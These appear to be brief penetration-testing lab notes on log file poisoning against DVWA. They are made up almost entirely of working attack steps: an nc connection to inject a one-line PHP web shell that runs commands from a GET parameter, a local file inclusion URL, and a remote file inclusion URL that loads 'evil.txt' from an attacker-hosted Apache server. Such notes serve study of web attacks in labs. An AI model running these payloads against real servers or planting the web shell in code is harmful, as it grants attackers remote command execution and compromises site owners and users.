# log file poisoning
## starting nc
nc -nv 10.11.0.22 80

## inserting script: 
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>

## local file inclusion
//refering to one file on the server
http://192.168.0.13/dvwa/vulnerabilities/fi/?page=/usr/share/perl/5.8.8/unicore/Jamo.txt

## remote file 
http://192.168.0.13/dvwa/vulnerabilities/fi/?page=http://192.168.0.9/evil.txt

//we can create such file and put in in our apache webserver
cat /var/www/html/evil.txt

//start apache
sudo systemctl start apache2